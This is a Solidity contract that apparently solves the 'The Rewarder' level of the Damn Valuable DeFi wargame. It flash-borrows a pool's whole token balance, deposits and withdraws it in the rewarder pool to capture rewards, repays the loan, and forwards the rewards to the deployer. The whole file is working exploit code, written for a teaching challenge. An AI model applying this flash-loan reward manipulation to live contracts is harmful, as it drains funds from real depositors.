// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract RewarderPoolAttacker {
    TheRewarderPool internal _rewarderPool;
    FlashLoanerPool internal _flashLoanerPool;
    DamnValuableToken internal _damnValuableToken;
    address internal _drainedFundsReceiver;

    constructor(TheRewarderPool _rPool, FlashLoanerPool _fPool, DamnValuableToken _dvt) {
        _rewarderPool = _rPool;
        _flashLoanerPool = _fPool;
        _damnValuableToken = _dvt;
        _drainedFundsReceiver = msg.sender;
    }

    function attackRewarderPool() external {
        _flashLoanerPool.flashLoan(_damnValuableToken.balanceOf(address(_flashLoanerPool)));
        _rewarderPool.rewardToken().transfer(
            _drainedFundsReceiver, _rewarderPool.rewardToken().balanceOf(address(this))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        _damnValuableToken.approve(address(_rewarderPool), amount);
        _rewarderPool.deposit(amount);
        _rewarderPool.withdraw(amount);
        _damnValuableToken.transfer(address(_flashLoanerPool), amount);
    }
}
